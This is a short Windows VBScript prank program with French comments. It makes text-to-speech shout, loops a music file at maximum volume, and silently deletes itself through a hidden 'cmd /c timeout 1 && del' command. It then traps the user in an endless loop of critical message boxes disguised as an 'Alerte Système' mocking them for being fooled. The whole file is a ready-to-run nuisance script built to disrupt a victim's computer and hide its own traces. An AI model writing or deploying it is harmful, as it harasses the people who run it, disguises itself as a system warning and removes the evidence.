' Créer les objets nécessaires
Set player = CreateObject("WMPlayer.OCX")
Set fso = CreateObject("Scripting.FileSystemObject")
Set voix = CreateObject("SAPI.SpVoice")
voix.Rate = 0 ' Vitesse normale
voix.Volume = 100 ' Volume au maximum


' Récupérer le chemin du dossier du script
scriptPath = fso.GetParentFolderName(WScript.ScriptFullName)
audioPath = scriptPath & "\musique.mp3" ' Nom du fichier audio

texte = "HE HE HE AAAAAAAAh!"
voix.Speak texte

' Configurer et jouer la musique en boucle
Set media = player.newMedia(audioPath)
player.currentPlaylist.appendItem(media)
player.settings.setMode "loop", True ' Activer la lecture en boucle
player.controls.play

' Créer un script temporaire pour supprimer le fichier
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Récupérer le chemin complet du script actuel
scriptPath = WScript.ScriptFullName

' Construire la commande pour supprimer le script après un court délai
deleteCommand = "cmd /c timeout 1 && del """ & scriptPath & """"

' Exécuter la commande pour supprimer ce script
shell.Run deleteCommand, 0, False

' Fenêtre en boucle (impossible à fermer proprement)
Do
    MsgBox "Ba alors, tu t'est fait avoir", 16, "Alerte Système"
    
Loop
